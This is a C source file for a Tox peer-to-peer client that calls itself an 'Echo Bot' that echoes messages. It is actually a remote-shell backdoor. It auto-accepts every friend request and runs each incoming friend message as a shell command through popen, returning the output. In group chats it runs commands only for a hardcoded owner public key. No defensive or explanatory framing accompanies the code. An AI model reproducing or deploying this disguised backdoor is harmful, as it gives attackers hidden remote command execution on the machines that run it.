//#include <zmq.h>
//#include "freak.c"
#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

#include <sodium/utils.h>
#include <tox/tox.h>


char *owner = "C402EB68AA26932D4F19EB69BEA82933B77CEC87EF329A96CB1D7FA3484F3A04" ;


typedef struct DHT_node {
  const char *ip;
  uint16_t port;
  const char key_hex[TOX_PUBLIC_KEY_SIZE * 2 + 1];
  unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
} DHT_node;


char *bin2hex(const uint8_t *bin, size_t length) {
	char *hex = malloc(2*length + 1);
	char *saved = hex;
	for (int i=0; i<length;i++,hex+=2) {
		sprintf(hex, "%02X",bin[i]);
	}
	return saved;
}


void friend_request_cb(Tox *tox, const uint8_t *public_key,
                       const uint8_t *message, size_t length, void *user_data) {
  tox_friend_add_norequest(tox, public_key, NULL);
}

void friend_message_cb(Tox *tox, uint32_t friend_number, TOX_MESSAGE_TYPE type,
                       const uint8_t *message, size_t length, void *user_data) {
  //printf("msg: %s \n", message);
  FILE *fp;
  char path[1035];
  fp = popen(message, "r");
  while (fgets(path, sizeof(path)-1, fp) != NULL) {
	//printf("%s", path);
	tox_friend_send_message(tox, friend_number, type, path, sizeof(path)-1, NULL);
  }
  pclose(fp);
}

void group_invite_cb(Tox *tox, uint32_t friend_num, TOX_CONFERENCE_TYPE type, const uint8_t *cookie, size_t length, void *user_data) {
	tox_conference_join(tox, friend_num, cookie, length, NULL );
}

void group_message_cb(Tox *tox, uint32_t group_num, uint32_t peer_number, TOX_MESSAGE_TYPE type, const uint8_t *message, size_t length, void *user_data) {
	uint8_t masterkey[TOX_PUBLIC_KEY_SIZE];
	tox_conference_peer_get_public_key(tox, group_num, peer_number, masterkey, NULL);
	char *mkeyhex = bin2hex(masterkey, sizeof(masterkey));
	if ( strcmp(mkeyhex, owner) == 0 ) {
		FILE *fp;
		char path[1035];
		fp = popen(message, "r");
		while (fgets(path, sizeof(path)-1, fp) != NULL) {
			//printf("%s", path);
			tox_conference_send_message(tox, group_num, TOX_MESSAGE_TYPE_NORMAL, path, sizeof(path)-1, NULL);
		}
		pclose(fp);
	}
}

void self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status,
                               void *user_data) {
  switch (connection_status) {
  case TOX_CONNECTION_NONE:
    printf("Offline\n");
    break;
  case TOX_CONNECTION_TCP:
    printf("Online, using TCP\n");
    break;
  case TOX_CONNECTION_UDP:
    printf("Online, using UDP\n");
    break;
  }
}

int main() {
  Tox *tox = tox_new(NULL, NULL);

  const char *name = "Echo Bot";
  tox_self_set_name(tox, name, strlen(name), NULL);

  const char *status_message = "Echoing your messages";
  tox_self_set_status_message(tox, status_message, strlen(status_message),
                              NULL);

  DHT_node nodes[] = {
      {"178.62.250.138",
       33445,
       "788236D34978D1D5BD822F0A5BEBD2C53C64CC31CD3149350EE27D4D9A2F9B6B",
       {0}},
      {"2a03:b0c0:2:d0::16:1",
       33445,
       "788236D34978D1D5BD822F0A5BEBD2C53C64CC31CD3149350EE27D4D9A2F9B6B",
       {0}},
      {"tox.zodiaclabs.org",
       33445,
       "A09162D68618E742FFBCA1C2C70385E6679604B2D80EA6E84AD0996A1AC8A074",
       {0}},
      {"163.172.136.118",
       33445,
       "2C289F9F37C20D09DA83565588BF496FAB3764853FA38141817A72E3F18ACA0B",
       {0}},
      {"2001:bc8:4400:2100::1c:50f",
       33445,
       "2C289F9F37C20D09DA83565588BF496FAB3764853FA38141817A72E3F18ACA0B",
       {0}},
      {"128.199.199.197",
       33445,
       "B05C8869DBB4EDDD308F43C1A974A20A725A36EACCA123862FDE9945BF9D3E09",
       {0}},
      {"2400:6180:0:d0::17a:a001",
       33445,
       "B05C8869DBB4EDDD308F43C1A974A20A725A36EACCA123862FDE9945BF9D3E09",
       {0}},
      {"node.tox.biribiri.org",
       33445,
       "F404ABAA1C99A9D37D61AB54898F56793E1DEF8BD46B1038B9D822E8460FAB67",
       {0}}};

  for (size_t i = 0; i < sizeof(nodes) / sizeof(DHT_node); i++) {
    sodium_hex2bin(nodes[i].key_bin, sizeof(nodes[i].key_bin), nodes[i].key_hex,
                   sizeof(nodes[i].key_hex) - 1, NULL, NULL, NULL);
    tox_bootstrap(tox, nodes[i].ip, nodes[i].port, nodes[i].key_bin, NULL);
  }

  uint8_t tox_id_bin[TOX_ADDRESS_SIZE];
  tox_self_get_address(tox, tox_id_bin);

  char tox_id_hex[TOX_ADDRESS_SIZE * 2 + 1];
  sodium_bin2hex(tox_id_hex, sizeof(tox_id_hex), tox_id_bin,
                 sizeof(tox_id_bin));

  for (size_t i = 0; i < sizeof(tox_id_hex) - 1; i++) {
    tox_id_hex[i] = toupper(tox_id_hex[i]);
  }

  printf("Tox ID: %s\n", tox_id_hex);

  tox_callback_friend_request(tox, friend_request_cb);
  tox_callback_friend_message(tox, friend_message_cb);
  tox_callback_conference_invite(tox, group_invite_cb);
  tox_callback_conference_message(tox, group_message_cb);


  tox_callback_self_connection_status(tox, self_connection_status_cb);

  while (1) {
    tox_iterate(tox, NULL);

    usleep(tox_iteration_interval(tox) * 1000);
  }

  tox_kill(tox);

  return 0;
}
